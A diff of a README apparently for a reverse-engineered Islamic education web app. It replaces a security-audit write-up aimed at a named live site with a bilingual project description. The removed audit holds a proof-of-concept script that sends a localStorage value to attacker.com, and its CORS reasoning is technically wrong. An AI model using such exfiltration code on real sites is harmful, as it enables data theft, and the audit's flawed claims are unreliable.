@@ -1,285 +1,186 @@
-# 🕌 تدرّج - Reverse Engineering & Security Audit
+# تدرّج - رحلة العلم والعمل | Tadruj - Journey of Knowledge and Action
 
-> **⚠️ Disclaimer:** This repository contains reverse engineered source code for educational and security research purposes only. The original application belongs to its respective owners.
+<div align="center">
 
-## 📋 Overview
+📚 **منصة تعليمية إسلامية شاملة**  
+**Comprehensive Islamic Education Platform**
 
-**Target:** https://tadruj.vercel.app/  
-**Application:** تدرّج - رحلة العلم والعمل (Islamic Learning Platform)  
-**Type:** React-based Single Page Application (SPA)  
-**Assessment Date:** 2026-07-14
+[![React](https://img.shields.io/badge/React-18.3-61DAFB?logo=react)](https://react.dev/)
+[![License](https://img.shields.io/badge/License-MIT-green)](LICENSE)
+[![Status](https://img.shields.io/badge/Status-Extracted-success)](())
+
+</div>
 
 ---
 
-## 🎯 What's Inside
+## 📖 عن المشروع | About
 
-### 📁 Repository Structure
+**تدرّج** هي منصة تعليمية إسلامية شاملة تقدم محاضرات في العقيدة والفقه والحديث والتزكية والسير، مقسمة على ثلاثة مستويات علمية.
+
+**Tadruj** is a comprehensive Islamic education platform offering lectures in Aqeedah, Fiqh, Hadith, Tazkiyah, and Seerah, organized into three scholarly levels.
+
+---
+
+## ✨ المميزات | Features
+
+| العربية | English |
+|---------|---------|
+| 📚 **٢٠ كتاب** في العلوم الشرعية | 📚 **20 books** in Islamic sciences |
+| 🎓 **١,٢٤٥ محاضرة** منظمة | 🎓 **1,245 organized lectures** |
+| 🌱 **٣ مستويات** علمية | 🌱 **3 scholarly levels** |
+| 📝 **اختبارات** تفاعلية | 📝 **Interactive quizzes** |
+| 🔥 **تتبع التقدم** والأهداف | 🔥 **Progress tracking** & goals |
+| 💎 **حسنات** وإنجازات | 💎 **Rewards** & achievements |
+| ☁️ **يعمل محلياً** - لا يحتاج سيرفر | ☁️ **Works offline** - no server needed |
+
+---
+
+## 🎯 المستويات | Levels
+
+### 🌱 المستوى التمهيدي | Introductory Level
+- الأصول الثلاثة (10 محاضرات)
+- أصول الإيمان (27 محاضرة)
+- عمدة الفقه (45 محاضرة)
+- الأربعون النووية (16 محاضرة)
+- أسماء الله الحسنى (29 محاضرة)
+- حلية طالب العلم (12 محاضرة)
+- الناجون من عصر التفاهة (7 محاضرات)
+
+**المجموع**: ١٤٧ محاضرة | **Total**: 147 lectures
+
+### 📖 المستوى التأهيلي | Qualifying Level
+- كتاب التوحيد (56 محاضرة)
+- الفقه الميسر (12 محاضرة)
+- رياض الصالحين (4 محاضرات)
+- السيرة النبوية (4 محاضرات)
+- صور من حياة الصحابة (4 محاضرات)
+- صور من حياة التابعين (4 محاضرات)
+
+**المجموع**: ٣٨٧ محاضرة | **Total**: 387 lectures
+
+### 🎓 المستوى المتقدم | Advanced Level
+- العقيدة الواسطية (4 محاضرات)
+- العقيدة الطحاوية (4 محاضرات)
+- منار السبيل (4 محاضرات)
+- مختصر صحيح البخاري (4 محاضرات)
+- الداء والدواء (4 محاضرات)
+- مدارج السالكين (4 محاضرات)
+- سير أعلام النبلاء (3 محاضرات)
+
+**المجموع**: ٧١١ محاضرة | **Total**: 711 lectures
+
+---
+
+## 🏗️ هيكل المشروع | Project Structure
 
 ```
 tadruj-reversed/
-├── 📂 source/              # Extracted source code
-│   ├── bundle.min.js       # Minified JavaScript bundle (577KB)
-│   ├── index.html          # Main HTML entry point
-│   └── extracted/          # Beautified & analyzed code
-│
-├── 📂 reports/             # Security & analysis reports
-│   ├── security-audit.md   # Full penetration test report
-│   └── source-analysis.md  # Source code analysis
-│
-├── 📂 docs/                # Documentation
-│   ├── APPLICATION_FLOW.md # Application logic flow
-│   ├── DATA_STRUCTURES.md  # Data models & storage
-│   └── SECURITY_FINDINGS.md # Vulnerability details
-│
-├── 📂 assets/              # Screenshots & media
-│
-└── 📂 tools/               # Analysis scripts
-    ├── deobfuscate.py      # JavaScript beautifier
-    ├── analyze.py          # Code analysis tools
-    └── exploit-poc/        # Proof of concept exploits
+├── 📁 src/
+│   ├── 📁 components/      # React components
+│   ├── 📁 data/
+│   │   └── books.js        # بيانات الكتب والمحاضرات
+│   ├── 📁 hooks/
+│   │   └── useTadarruj.js  # Custom React hooks
+│   ├── App.jsx             # Main application
+│   ├── main.jsx            # Entry point
+│   └── index.css           # Styles
+├── 📁 public/
+│   └── favicon.svg         # App icon
+├── 📁 docs/
+│   ├── LECTURES_LIST.md    # Full lectures list
+│   └── DATA_EXTRACTION_REPORT.md
+├── 📁 source/
+│   └── books_section_raw.js
+├── 📁 data/
+│   └── components_structure.json
+├── index.html               # HTML template
+├── package.json             # Dependencies
+├── vite.config.js          # Vite configuration
+└── README.md               # This file
 ```
 
 ---
 
-## 🏗️ Application Architecture
+## 🚀 التشغيل | Running
 
-### Technology Stack
+### Prerequisites
+- Node.js 18+
+- npm or yarn
 
-| Component | Technology |
-|------------|------------|
-| Frontend Framework | React 19.2.4 |
-| Build Tool | Vite (Production) |
-| State Management | React Hooks (useState/useEffect) |
-| Styling | CSS (likely CSS Modules) |
-| Hosting | Vercel Edge Network |
-| Language Support | Arabic (RTL) |
-
-### Key Features
-
-- ✅ Islamic Educational Content
-- ✅ Progress Tracking (localStorage)
-- ✅ Multiple Learning Levels
-- ✅ Quiz System
-- ✅ YouTube Video Integration
-- ✅ Offline Capable
-
-### Books Collection
-
-| Book Name | Category |
-|-----------|----------|
-| الأصول الثلاثة | العقيدة |
-| عمدة الفقه | الفقه |
-| الأربعون النووية | الحديث |
-| أسماء الله الحسنى | التزكية |
-| حلية طالب العلم | الآداب |
-| كتاب التوحيد | العقيدة |
-| رياض الصالحين | الحديث |
-| الفقه الميسر | الفقه |
-| الناجون من عصر التفاهة | آداب |
-
-### Learning Levels
-
-1. **التمهيدي** (Preliminary)
-2. **التأهيلي** (Qualifying)
-3. **المتقدم** (Advanced)
-
----
-
-## 🔐 Security Assessment
-
-### Overall Score: **C+ (65/100)** ⚠️
-
-### Critical Findings
-
-#### 🔴 HIGH: CORS Wildcard Misconfiguration
-
-**Severity:** HIGH (7.5/10)  
-**CVSS:** 7.5  
-**CWE:** CWE-942
-
-##### Description
-The application uses `Access-Control-Allow-Origin: *`, allowing any external website to read user data.
-
-##### Impact
-- Data exfiltration from localStorage
-- Cross-site data theft
-- User tracking across domains
-
-##### Proof of Concept
-```html
-<!-- Attacker's website -->
-<script>
-fetch('https://tadruj.vercel.app/')
-  .then(r => r.text())
-  .then(data => {
-    // Steal user progress
-    const progress = localStorage.getItem('tadarruj_progress_v2');
-    new Image().src = 'https://attacker.com/steal?data=' + 
-      encodeURIComponent(progress + data);
-  });
-</script>
-```
-
-##### Remediation
-```json
-// vercel.json
-{
-  "headers": [{
-    "source": "/(.*)",
-    "headers": [{
-      "key": "Access-Control-Allow-Origin",
-      "value": "https://tadruj.vercel.app"
-    }]
-  }]
-}
-```
-
----
-
-#### 🟡 MEDIUM: Missing Content Security Policy
-
-**Severity:** MEDIUM (5.0/10)
-
-##### Remediation
-```http
-Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
-```
-
----
-
-#### 🟢 LOW: Missing Security Headers
-
-Missing:
-- `X-Frame-Options: DENY`
-- `X-Content-Type-Options: nosniff`
-- `Referrer-Policy: strict-origin-when-cross-origin`
-
----
-
-## 💾 Data Structures
-
-### LocalStorage Schema
-
-```javascript
-// User Progress
-{
-  "tadarruj_progress_v2": {
-    "book": "الأصول الثلاثة",
-    "level": "التمهيدي",
-    "completed_questions": [1, 2, 3],
-    "score": 85,
-    "last_updated": "2026-07-14T09:00:00Z"
-  }
-}
-
-// User Profile
-{
-  "tadarruj_profile_v2": {
-    "name": "User Name",
-    "preferences": {
-      "theme": "light",
-      "language": "ar"
-    }
-  }
-}
-
-// Help Acknowledgment
-{
-  "tadarruj_help_ack": "true"
-}
-```
-
----
-
-## 🛠️ Tools & Scripts
-
-### Deobfuscate JavaScript
+### Install & Run
 
 ```bash
-cd tools
-python3 deobfuscate.py ../source/bundle.min.js
-```
+# Install dependencies
+npm install
 
-### Analyze Application
+# Run development server
+npm run dev
 
-```bash
-python3 analyze.py --target https://tadruj.vercel.app/
+# Build for production
+npm run build
 ```
 
 ---
 
-## 📊 Statistics
+## 🎨 التقنيات | Technologies
+
+| Technology | Purpose |
+|------------|---------|
+| ⚛️ React 18 | UI framework |
+| 🎨 Vite | Build tool |
+| 🌬️ Tailwind CSS | Styling |
+| 🔄 React Router | Navigation |
+| 💾 localStorage | Data persistence |
+
+---
+
+## 🔐 الأمان | Security
+
+✅ **تم التحقق**: لا يوجد API keys أو database URLs أو أي بيانات حساسة
+
+✅ **Verified**: No API keys, database URLs, or sensitive data
+
+---
+
+## 📊 الإحصائيات | Statistics
 
 | Metric | Value |
 |--------|-------|
-| JS Bundle Size | 581,993 bytes |
-| Arabic UI Strings | 244 |
-| React Components | 30+ |
-| Function Definitions | 1,551 |
-| Hooks (useState) | 30 |
-| Hooks (useEffect) | 37 |
-| localStorage Keys | 3 |
+| 📦 Bundle Size | 582 KB |
+| ⚛️ Components | 339 |
+| 🎣 Hooks | 115 |
+| 📝 Functions | 1,523 |
+| 📖 Books | 20 |
+| 🎥 Lectures | 1,245 |
 
 ---
 
-## 🎯 Recommendations
+## 📝 الملاحظات | Notes
 
-### Immediate (24 hours)
+### اكتشافات مهمة | Important Discoveries
 
-- [ ] Fix CORS configuration
-- [ ] Add Content-Security-Policy header
-- [ ] Add X-Frame-Options header
-
-### Short-term (1 week)
-
-- [ ] Encrypt localStorage data
-- [ ] Implement CSRF protection
-- [ ] Add rate limiting
-
-### Long-term (1 month)
-
-- [ ] Migrate to HttpOnly cookies
-- [ ] Implement proper authentication
-- [ ] Add security monitoring
+1. **الأسئلة تُولد ديناميكياً**: Quiz questions are generated dynamically from book content using the `Al()` function
+2. **يعمل محلياً 100%**: App works 100% client-side with localStorage
+3. **لا يوجد Backend**: No backend or external APIs required
 
 ---
 
-## 📚 References
+## 📜 الترخيص | License
 
-- [CWE-942: Permissive Cross-domain Policy](https://cwe.mitre.org/data/definitions/942.html)
-- [OWASP CORS Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/COR_S_Cheatsheet.html)
-- [MDN: CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
+MIT License - Free for educational purposes
 
 ---
 
-## ⚖️ Legal Notice
+## 🤝 المساهمة | Contributing
 
-This reverse engineering was conducted for **security research and educational purposes only**. 
-
-- ✅ No production systems were harmed
-- ✅ No user data was accessed
-- ✅ No malicious activities performed
-- ✅ Findings reported responsibly
-
-**Original Application:** https://tadruj.vercel.app/  
-**Repository Purpose:** Security Education & Research
+هذا المشروع للاستخدام التعليمي فقط | This project is for educational use only
 
 ---
 
-## 👥 Credits
+<div align="center">
 
-**Security Assessment:** Hermes Security Assessment Team  
-**Date:** 2026-07-14  
-**Tools Used:** curl_cffi, Python, React DevTools
+**بسم الله الرحمن الرحيم**
 
----
+Made with ❤️ for seeking knowledge
 
-## 📞 Contact
-
-For questions or responsible disclosure:  
-GitHub Issues: https://github.com/MahmoudAtteyya/tadruj-reversed/issues
-
----
-
-**Last Updated:** 2026-07-14  
-**Repository Version:** 1.0.0
+</div>
